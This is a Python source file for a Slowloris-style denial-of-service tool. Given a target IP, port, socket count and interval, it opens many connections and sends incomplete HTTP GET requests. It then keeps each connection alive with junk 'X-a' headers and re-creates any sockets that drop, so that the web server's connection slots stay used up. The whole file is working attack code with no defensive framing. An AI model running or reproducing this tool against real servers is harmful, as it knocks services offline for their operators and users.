#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from socket import socket, AF_INET, SOCK_STREAM, error
from random import randint
from time import sleep
from sys import argv
from progress import counter
from ANSI import *

version = ' 0.1'
regular_headers = ["User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Accept-language: en-US,en,q=0.5"]

with open('ascii.txt') as file:
  loris = file.read()

print(SCREENC, loris, '\nversion:'+version,'\n')

def init(ip, port):
  s = socket(AF_INET, SOCK_STREAM)
  s.settimeout(4)
  s.connect((ip, int(port)))
  s.send("GET /?{} HTTP/1.1\r\n".format(randint(0,2000)).encode('UTF-8'))
  for header in regular_headers:
    s.send('{}\r\n'.format(header).encode('UTF-8'))
  return s

def main():
  if len(argv)<5:
    print(REDC+"Usage: {} ip port count time".format(argv[0]))
    return
  ip = argv[1]
  port = argv[2]
  socket_count = int(argv[3])
  bar = counter.Counter(GREENC+'Creating Sockets: '+YELLOWC, max=socket_count)
  timer = int(argv[4])
  socket_list = []
  for _ in range(socket_count):
    try:
      s=init(ip, port)
    except error:
      break
    socket_list.append(s)
    bar.next()
  print('\n')
  while True:
    print(GREYC+"Sending Headers")
    for s in socket_list:
      try:
        s.send('X-a {}\r\n'.format(randint(1,5000)).encode('utf-8'))
      except error:
        socket_list.remove(s)
    for _ in range(socket_count - len(socket_list)):
      print(PURPLEC+"Re-creating Socket...")
      try:
        s=init(ip, port)
        if s:
          socket_list.append(s)
      except error:
        break
    sleep(timer)
if __name__=='__main__':
  main()